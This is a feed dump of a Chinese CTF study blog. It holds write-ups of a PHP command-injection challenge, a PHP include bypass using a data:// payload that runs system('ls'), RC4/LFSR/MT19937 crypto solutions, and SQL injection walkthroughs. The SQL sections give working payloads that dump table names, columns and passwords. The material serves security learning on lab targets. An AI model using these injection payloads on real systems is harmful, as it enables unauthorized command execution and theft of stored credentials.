|\/|cat|flag|ctfhub)/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>?ip=127.0.0.1%0als</code><br>有个flag_is_here的目录<br><code>?ip=127.0.0.1%0als$&#123;IFS&#125;fla?_is_here</code><br>看到果然在里面</p><p><code>?ip=127.0.0.1%0acd$&#123;IFS&#125;fla?_is_here%0atac$&#123;IFS&#125;*.php</code></p><h2 id="攻防世界-Web-php-include"><a href="#攻防世界-Web-php-include" class="headerlink" title="攻防世界-Web_php_include"></a>攻防世界-Web_php_include</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br><span class="hljs-keyword">while</span> (strstr(<span class="hljs-variable">$page</span>, <span class="hljs-string">&quot;php://&quot;</span>)) &#123;<br>    <span class="hljs-variable">$page</span>=str_replace(<span class="hljs-string">&quot;php://&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$page</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这一题不是很难，然后就借着这题收集了一些姿势</p><h4 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h4><p>过滤php://    主要是为了过滤php://input<br>然后可以大小写绕过<br><img src="/picture/zhixing10.png"></p><h2 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h2><p>过滤了，php://input<br>可以用data://  就等价的<br><code>?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==</code><br><code>&lt;?php system(&#39;ls&#39;); ?&gt;</code>base64编码为<code>PD9waHAgc3lzdGVtKCdscycpOyA/Pg==</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GXYCTF2019-Ping-Ping-Ping&quot;&gt;&lt;a href=&quot;#GXYCTF2019-Ping-Ping-Ping&quot; class=&quot;headerlink&quot; title=&quot;[GXYCTF2019]Ping Ping Ping&quot;&gt;&lt;/a&gt;[GXYCTF201</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>流密码</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/20/%E6%B5%81%E5%AF%86%E7%A0%81/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/20/%E6%B5%81%E5%AF%86%E7%A0%81/</id>
    <published>2022-03-20T08:00:35.000Z</published>
    <updated>2022-03-20T08:40:03.633Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Replay"><a href="#Replay" class="headerlink" title="Replay"></a>Replay</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>key=urandom(<span class="hljs-number">10</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Rc4_Encrypt</span>(<span class="hljs-params">msg,key</span>):</span><br>    Rc4=ARC4.new(key)<br><br>    <span class="hljs-keyword">return</span> Rc4.encrypt(msg).<span class="hljs-built_in">hex</span>()<br><br>hint=<span class="hljs-string">b&#x27;do you know how to recover the keystream?&#x27;</span><br><span class="hljs-built_in">print</span>(Rc4_Encrypt(hint,key))<br><span class="hljs-comment">#56c36031c2d6455ced3eed3f267251a023478f493c3fc567956869930483b0334a1b4bf4c74eda8151</span><br><span class="hljs-built_in">print</span>(Rc4_Encrypt(flag,key))<br><span class="hljs-comment">#54c0212fd6c05154e265a82c767c16e26e1a9c036b6cce72932f79de0dd0f66f1a5a0cb9d756</span><br></code></pre></td></tr></table></figure><p>RC4已知明文攻击</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> binascii import *<br><span class="hljs-attribute">from</span> Crypto.Util.strxor import strxor<br><span class="hljs-attribute">m1</span>=b&#x27;do you know how to recover the keystream?&#x27;<br><span class="hljs-attribute">c1</span>=&#x27;<span class="hljs-number">56</span>c<span class="hljs-number">36031</span>c<span class="hljs-number">2</span>d<span class="hljs-number">6455</span>ced<span class="hljs-number">3</span>eed<span class="hljs-number">3</span>f<span class="hljs-number">267251</span>a<span class="hljs-number">023478</span>f<span class="hljs-number">493</span>c<span class="hljs-number">3</span>fc<span class="hljs-number">567956869930483</span>b<span class="hljs-number">0334</span>a<span class="hljs-number">1</span>b<span class="hljs-number">4</span>bf<span class="hljs-number">4</span>c<span class="hljs-number">74</span>eda<span class="hljs-number">8151</span>&#x27;<br><span class="hljs-attribute">c1</span>=unhexlify(c<span class="hljs-number">1</span>)    # 将十六进制字符串转换成bytes流<br><span class="hljs-attribute">keystream</span>=strxor(m<span class="hljs-number">1</span>,c<span class="hljs-number">1</span>)  #strxor两个比特流逐比特亦或得到密钥流<br><span class="hljs-attribute">c2</span>=&#x27;<span class="hljs-number">54</span>c<span class="hljs-number">0212</span>fd<span class="hljs-number">6</span>c<span class="hljs-number">05154</span>e<span class="hljs-number">265</span>a<span class="hljs-number">82</span>c<span class="hljs-number">767</span>c<span class="hljs-number">16</span>e<span class="hljs-number">26</span>e<span class="hljs-number">1</span>a<span class="hljs-number">9</span>c<span class="hljs-number">036</span>b<span class="hljs-number">6</span>cce<span class="hljs-number">72932</span>f<span class="hljs-number">79</span>de<span class="hljs-number">0</span>dd<span class="hljs-number">0</span>f<span class="hljs-number">66</span>f<span class="hljs-number">1</span>a<span class="hljs-number">5</span>a<span class="hljs-number">0</span>cb<span class="hljs-number">9</span>d<span class="hljs-number">756</span>&#x27;<br><span class="hljs-attribute">c2</span>=unhexlify(c<span class="hljs-number">2</span>)<br><span class="hljs-attribute">print</span>(strxor(c<span class="hljs-number">2</span>,keystream[:len(c<span class="hljs-number">2</span>)]))<br></code></pre></td></tr></table></figure><p>strxor函数实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strxor</span>(<span class="hljs-params">a, b</span>):</span>     <br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) &gt; <span class="hljs-built_in">len</span>(b):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(x) ^ <span class="hljs-built_in">ord</span>(y)) <span class="hljs-keyword">for</span> (x, y) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a[:<span class="hljs-built_in">len</span>(b)], b)])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(x) ^ <span class="hljs-built_in">ord</span>(y)) <span class="hljs-keyword">for</span> (x, y) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a, b[:<span class="hljs-built_in">len</span>(a)])])<br></code></pre></td></tr></table></figure><h2 id="Easy-Lfsr"><a href="#Easy-Lfsr" class="headerlink" title="Easy_Lfsr"></a>Easy_Lfsr</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br>flag=<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+<span class="hljs-built_in">hex</span>(getrandbits(<span class="hljs-number">32</span>))[<span class="hljs-number">2</span>:]+<span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lfsr</span>(<span class="hljs-params">R,mask</span>):</span><br>    output = (R &lt;&lt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffff</span>  <br>    i=(R&amp;mask)&amp;<span class="hljs-number">0xffffffff</span><br>    lastbit=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i!=<span class="hljs-number">0</span>:<br>        lastbit^=(i&amp;<span class="hljs-number">1</span>)<br>        i=i&gt;&gt;<span class="hljs-number">1</span><br>    output^=lastbit<br>    <span class="hljs-keyword">return</span> (output,lastbit)<br><br><br><br>R=<span class="hljs-built_in">int</span>(flag[<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>mask =<span class="hljs-number">0b10100110001000111000100110010001</span><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    tmp=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        (R,out)=lfsr(R,mask)<br>        tmp=(tmp&lt;&lt;<span class="hljs-number">1</span>)^out<br>    f.write(<span class="hljs-built_in">chr</span>(tmp).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>))<br>f.close()<br><br></code></pre></td></tr></table></figure><p>先得到key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>s=f.read()<br><span class="hljs-built_in">print</span>(hexlify(s))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> *<br>key=<span class="hljs-number">0x25aaea999c18a4e3</span><br>bin_out=<span class="hljs-built_in">bin</span>(key)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>*<span class="hljs-number">8</span>)<br>key=bin_out[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>]<br>mask =<span class="hljs-string">&#x27;10100110001000111000100110010001&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(mask))<br>R=<span class="hljs-string">&#x27;&#x27;</span><br>tem=key<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    output=<span class="hljs-string">&#x27;?&#x27;</span>+key[:<span class="hljs-number">31</span>]<br>    ans=<span class="hljs-built_in">int</span>(tem[-<span class="hljs-number">1</span>-i])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">1</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">5</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">8</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">9</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">12</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">16</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">17</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">18</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">22</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">26</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">27</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">30</span>])<br>    R+=<span class="hljs-built_in">str</span>(ans)<br>    key=<span class="hljs-built_in">str</span>(ans)+key[:<span class="hljs-number">31</span>]<br><span class="hljs-built_in">print</span>(R[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h2 id="Mt-19937"><a href="#Mt-19937" class="headerlink" title="Mt_19937"></a>Mt_19937</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>    f.write(<span class="hljs-built_in">str</span>(getrandbits(<span class="hljs-number">32</span>))+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <br>flag=<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+<span class="hljs-built_in">hex</span>(getrandbits(<span class="hljs-number">32</span>))[<span class="hljs-number">2</span>:]+<span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br>f.close()<br></code></pre></td></tr></table></figure><p>预测随机数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">invert_right</span>(<span class="hljs-params">m,l,val=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>    length = <span class="hljs-number">32</span><br>    mx = <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">if</span> val == <span class="hljs-string">&#x27;&#x27;</span>:<br>        val = mx<br>    i,res = <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i*l&lt;length:<br>        mask = (mx&lt;&lt;(length-l)&amp;mx)&gt;&gt;i*l<br>        tmp = m &amp; mask<br>        m = m^tmp&gt;&gt;l&amp;val<br>        res += tmp<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">invert_left</span>(<span class="hljs-params">m,l,val</span>):</span><br>    length = <span class="hljs-number">32</span><br>    mx = <span class="hljs-number">0xffffffff</span><br>    i,res = <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i*l &lt; length:<br>        mask = (mx&gt;&gt;(length-l)&amp;mx)&lt;&lt;i*l<br>        tmp = m &amp; mask<br>        m ^= tmp&lt;&lt;l&amp;val<br>        res |= tmp<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">invert_temper</span>(<span class="hljs-params">m</span>):</span><br>    m = invert_right(m,<span class="hljs-number">18</span>)<br>    m = invert_left(m,<span class="hljs-number">15</span>,<span class="hljs-number">4022730752</span>)<br>    m = invert_left(m,<span class="hljs-number">7</span>,<span class="hljs-number">2636928640</span>)<br>    m = invert_right(m,<span class="hljs-number">11</span>)<br>    <span class="hljs-keyword">return</span> m<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clone_mt</span>(<span class="hljs-params">record</span>):</span><br>    state = [invert_temper(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> record]<br>    gen = Random()<br>    gen.setstate((<span class="hljs-number">3</span>,<span class="hljs-built_in">tuple</span>(state+[<span class="hljs-number">0</span>]),<span class="hljs-literal">None</span>))<br>    <span class="hljs-keyword">return</span> gen<br><br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).readlines()<br>prng = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>    i = i.strip(<span class="hljs-string">&#x27;n&#x27;</span>)<br>    prng.append(<span class="hljs-built_in">int</span>(i))<br><br>g = clone_mt(prng[:<span class="hljs-number">624</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>    g.getrandbits(<span class="hljs-number">32</span>)<br><br>key = g.getrandbits(<span class="hljs-number">32</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(key))<br></code></pre></td></tr></table></figure><p><a href="https://www.anquanke.com/post/id/205861#h2-3">MT19937伪随机数生成算法详细说明</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Replay&quot;&gt;&lt;a href=&quot;#Replay&quot; class=&quot;headerlink&quot; title=&quot;Replay&quot;&gt;&lt;/a&gt;Replay&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入题</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/18/SQL%E6%B3%A8%E5%85%A5%E9%A2%98/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/18/SQL%E6%B3%A8%E5%85%A5%E9%A2%98/</id>
    <published>2022-03-18T02:47:56.000Z</published>
    <updated>2022-03-23T14:14:39.524Z</updated>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战2019-LoveSQL"><a href="#极客大挑战2019-LoveSQL" class="headerlink" title="极客大挑战2019-LoveSQL"></a>极客大挑战2019-LoveSQL</h2><p>1、<br>万能密码: <code>&#39; or 1=1#</code><br><img src="/picture/web20.png"></p><p>2、<br>查列数:<br><code>&#39; or 1=1 order by 1#</code><br><code>&#39; or 1=1 order by 2#</code><br><code>&#39; or 1=1 order by 3#</code><br><code>&#39; or 1=1 order by 4#</code></p><p>4的时候报错，所以有三列<br><img src="/picture/web21.png"></p><p>3<br>查数据库:<br><code>-1&#39;union select 1,2,database()#</code></p><p>为什么这里不用万能密码了呢？因为不需要，井号已经把查询密码的注释掉了<br>前面的-1是干什么用的呢？因为我们看到它只能显示出两条数据，一个是用户名，一个是密码。所以这个-1就是让这个查不出来(也可以是其他的比如1)，这个再union注入那里有写<br><img src="/picture/web22.png"><br>至于为什么出来了2，而1没有出来，我也不太清楚</p><p>所以查出来数据库是geek</p><p>4、<br>查表<br><code>-1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code><br>其实上一步查数据库是可以省略的，因为直接<code>where table_schema=database()</code>即可</p><p><img src="/picture/web23.png"><br>可以看到查到了两个表，geekuser,l0ve1ysq1</p><p>5、查字段<br><code>-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39;#</code></p><p>先看下l0ve1ysq1表，同理可得geekuser<br><img src="/picture/web24.png"></p><p>可以看到有三个字段id,username,password</p><p>6、查数据<br><code>-1&#39;union select 1,2,group_concat(password) from geek.l0ve1ysq1#</code><br>先查password的数据<br><img src="/picture/web25.png"><br>也可以直接把三个字段数据全部爆出来<br><code>-1&#39;union select 1,2,group_concat(id,username,password) from geek.l0ve1ysq1#</code></p><p>flag直接出来了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;极客大挑战2019-LoveSQL&quot;&gt;&lt;a href=&quot;#极客大挑战2019-LoveSQL&quot; class=&quot;headerlink&quot; title=&quot;极客大挑战2019-LoveSQL&quot;&gt;&lt;/a&gt;极客大挑战2019-LoveSQL&lt;/h2&gt;&lt;p&gt;1、&lt;br&gt;万能密码</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>sql注入和sqlmap的使用</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/17/sql%E6%B3%A8%E5%85%A5-0/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/17/sql%E6%B3%A8%E5%85%A5-0/</id>
    <published>2022-03-17T14:25:01.000Z</published>
    <updated>2022-04-02T06:23:58.029Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>还是有点乱，有时间会把弄好的</p></blockquote><p>常见的SQL注入有数字型注入、Union注入、字符型注入、布尔盲注、时间注入、报错注入和堆叠注入</p><p>浏览器会自动将URI中的特殊字符进行URL编码，服务器收到请求后会自动进行URL解码</p><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p><code>SELECT username, password FROM users WHERE username=&#39;&#39; or 1=1 -- AND password=&#39;anything</code><br>用户的输入用户名为<code>&#39; or 1=1 #</code>，密码为任意值即可<br>或者<code>&#39; or 1=1 --+&#39;</code>   ，加号会转义成空格</p><h2 id="information-schema数据库"><a href="#information-schema数据库" class="headerlink" title="information_schema数据库"></a>information_schema数据库</h2><p><img src="/picture/web19.png"></p><p>1、查看数据库名<br><code>select schema_name from information_schema.schemata;</code></p><p>2、查看表名<br><code>select table_name from information_schema.tables where table_schema=&#39;security&#39;;</code><br>这个security是上一步查出来的数据库名称</p><p>3、查看列名<br><code>select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;;</code><br>users是上一步查出来的表名</p><p>4、查数据<br><code>select username,password from security.users;</code><br>username和password是一步查出来的列名</p><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>1、<code>?id=1&#39;</code>  加单引号输出错误<br>2、<code>?id=1 and 1=1</code> 输出正常<br>3、<code>?id=1 and 1=2</code> 输出错误<br>则存在数字型注入漏洞(或直接通过id=3-1和id=2的回显页面一致，判断这里存在数字型注入)</p><p>4、然后通过联合查询，查询到本数据库的其他所有表名<br><code>?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</code><br>table_name字段是information_schema库中tables表的表名字段，表中还有数据库名字段table_schema。database()函数返回的内容是当前数据库的名称。group_contact是用<code>，</code>联合多行记录的函数，也就是说该语句可以联合查询当前库的所有（事实上有一定长度限制）表名并显示在一个字段中。</p><p>5、通过columns表及其中的column_name查询出的内容即为wp_user（上一步查询出的一个表名）中的字段名<br><code>?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;wp_user&#39;</code></p><h2 id="字符型注入流程"><a href="#字符型注入流程" class="headerlink" title="字符型注入流程"></a>字符型注入流程</h2><p>1、判断是否存在注入点<br>先输入一个单引号，看页面是否错误输出，如果错误输出，继续进行下一步(或者 id=3-1观察页面是否为空再<br>id=2a观察页面是否有结果，如果有，那么多半就是字符型)</p><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=1#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=1#</font></p><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=2#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=2#</font></p><p>两次尝试后1=1正常输出，1=2错误输出，证明SQL语句生效，存在SQL注入漏洞</p><p>尝试使用单引号来闭合前面的单引号，再用<code>--%20</code>或<code>%23</code>注释后面的语句。这里一定要用<strong>url编码，空格的编码是%20,   #的编码是%23<br>id=2%27%23</strong><br><code>where id=&#39;1&#39;#&#39; </code>  此时的MySQL语句</p><p>2、判断数据库列数  order by [column_num]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 1 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 2 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 3 #</font>‘ </p><p>当表中只有两列，order by 3就会出错</p><p>3、联合查询其他信息  union select [sql1] [sql2]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select  user(),database()#</font>‘<br>用户输入的SQL语句，执行了MYSQL内置函数user()和database(),user()返回当前数据库连接用户，database()返回当前数据库名称</p><p>4、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union select table_name,table_schema  from  information_schema.tables  where  table_schema=’dvwa’#</font>‘<br>从information_schema数据库中查询dvwa数据库表<br>这一步是为了查询数据库中有哪些表，因为上一步查到了数据库的名称,这个dvwa就是上一步查询到的数据库的名称。我们想要看看这个数据库里面有什么东西，除了数据库名称根据实际进行更改，其他内容是固定不变的。</p><p>5、联合查询信息  union [query_sql]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select user,password  from  users#</font>‘<br>上一步查询到数据库中有哪些表，现在想要查看表中的内容。假设这里的users就是上一步中查到的表，猜测可能会有user和password这两个属性，查询user和password的值</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h4 id="各数据库在字符串处理时的区别"><a href="#各数据库在字符串处理时的区别" class="headerlink" title="各数据库在字符串处理时的区别"></a>各数据库在字符串处理时的区别</h4><p><img src="/picture/sql1.png"></p><p><code>id=1&#39; and (ascii(substr(database(),1,1))=115)=1%23 </code>由于数据库第一位s的ascii值为115，就构造出1=1的结构，页面正常</p><h4 id="limit使用"><a href="#limit使用" class="headerlink" title="limit使用"></a>limit使用</h4><p><code>select * from table limit m,n;</code><br>注意这里的m是从0开始，得到第一张表需要用到limit 0,1</p><p>直接通过字符串截取对比，类似函数很多后面做个总结吧</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; and substr((select user()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;r&#x27; 